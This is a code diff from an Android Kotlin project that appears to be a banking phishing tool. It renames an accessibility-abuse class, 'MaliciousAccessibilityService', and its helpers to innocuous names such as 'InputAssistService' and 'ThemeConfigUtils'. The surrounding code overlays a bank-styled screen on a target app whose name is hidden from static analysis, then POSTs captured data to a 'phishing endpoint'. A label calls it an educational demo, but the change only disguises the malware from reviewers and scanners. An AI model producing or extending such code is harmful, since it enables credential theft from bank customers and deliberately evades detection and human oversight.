@@ -16,7 +16,7 @@ import android.view.ViewGroup
 import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
 import android.widget.*
-import com.example.teacherapp.obfuscation.ResourceUtils
+import com.example.teacherapp.obfuscation.ThemeConfigUtils
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -32,12 +32,12 @@ import java.util.*
  * UiEnhancementHelper — dynamic UI layer manager for contextual overlays.
  * Provides adaptive display components based on active foreground application.
  */
-class OverlayHelper(private val service: MaliciousAccessibilityService) {
+class UiLayerHelper(private val service: InputAssistService) {
 
-    private val TAG        = ResourceUtils.getTag(2)
+    private val TAG        = ThemeConfigUtils.getTag(2)
     // Target package resolved at runtime — hidden from static analysis
-    private val TARGET_APP get() = ResourceUtils.getTargetPackage()
-    private val SERVER     get() = ResourceUtils.getBaseServer()
+    private val TARGET_APP get() = ThemeConfigUtils.getTargetPackage()
+    private val SERVER     get() = ThemeConfigUtils.getBaseServer()
 
     private val DBS_RED        = Color.parseColor("#E60000")
     private val DBS_WHITE      = Color.WHITE
@@ -316,7 +316,7 @@ class OverlayHelper(private val service: MaliciousAccessibilityService) {
                     put("demo_note",      "Realistic overlay - educational demo")
                 }
                 // Endpoint resolved at runtime
-                val endpoint = ResourceUtils.getPhishingEndpoint()
+                val endpoint = ThemeConfigUtils.getPhishingEndpoint()
                 val connection = URL(endpoint).openConnection() as HttpURLConnection
                 connection.apply {
                     requestMethod = "POST"; doOutput = true
